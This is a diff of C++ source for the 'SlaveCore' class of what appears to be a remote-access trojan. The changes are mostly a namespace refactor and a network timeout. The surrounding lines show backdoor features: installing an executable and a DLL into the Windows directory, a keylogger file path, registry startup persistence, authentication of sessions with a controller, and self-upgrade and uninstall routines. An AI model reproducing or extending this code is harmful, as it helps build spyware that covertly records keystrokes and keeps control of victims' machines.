@@ -1,12 +1,11 @@
-#include <common/Log.hpp>
+#include <log/Log.hpp>
 
 #include <system/System.hpp>
 #include <system/Registry.hpp>
 #include <system/Process.hpp>
 using namespace System;
 
-#include <Innocence.hpp>
-using namespace Innocence;
+#include <common/Innocence.hpp>
 
 #include <blaspheme/transfer/FileTransfer.hpp>
 using namespace Blaspheme;
@@ -19,12 +18,12 @@ using namespace Blaspheme;
 
 namespace Inhibition
 {
-    SlaveCore::SlaveCore(ConnectionInfo info) : 
+    SlaveCore::SlaveCore(Common::ConnectionInfo info) : 
 		exited(false),
-		session(info),
-		installPath(System::getWindowsPath() + "\\" + Innocence::INHIBITER_EXE_NAME),
-		keylogPath(System::getWindowsPath() + "\\" + Innocence::KEYLOG),
-		dllPath(System::getWindowsPath() + "\\" + Innocence::INHIBITION_DLL_NAME),
+		session(info, Network::Timeout(60)),
+		installPath(System::getWindowsPath() + "\\" + Common::INHIBITER_EXE_NAME),
+		keylogPath(System::getWindowsPath() + "\\" + Common::KEYLOG),
+		dllPath(System::getWindowsPath() + "\\" + Common::INHIBITION_DLL_NAME),
 		startup(installPath)
 	{
 		setConnection(info);
@@ -92,7 +91,7 @@ namespace Inhibition
         {
             if(auth.authentificate(aux))
             {
-                aux.send(toString(session.get_id())+'\n');
+                aux.send(Common::toString(session.get_id())+'\n');
                 session.push_stream(aux);
                 return true;
             }
@@ -105,12 +104,12 @@ namespace Inhibition
         return false;
     }
 
-	const ConnectionInfo& SlaveCore::getConnection()const
+	const Common::ConnectionInfo& SlaveCore::getConnection()const
 	{
 		return session.getConnection();
 	}
 
-    void SlaveCore::setConnection(const ConnectionInfo& info)
+    void SlaveCore::setConnection(const Common::ConnectionInfo& info)
     {
 		session.setConnection(info);
     }
@@ -152,7 +151,7 @@ namespace Inhibition
         LOG << "Removing registry key";
         startup.uninstall();
         LOG << "Launching uninstaller";
-        System::Process::Launcher uninstaller(getInstallPath(), Innocence::UNINSTALL_CMD);		
+        System::Process::Launcher uninstaller(getInstallPath(), Common::UNINSTALL_CMD);		
         exit();
         return true;
     }
@@ -162,7 +161,7 @@ namespace Inhibition
         LOG << "Upgrading executable";
         if(!DeleteFile(getInstallPath().c_str()))
         {
-            LOG << "DeleteFile failed : "+toString(GetLastError());
+            LOG << "DeleteFile failed : "+Common::toString(GetLastError());
             session << FAILURE;
             return;
         }
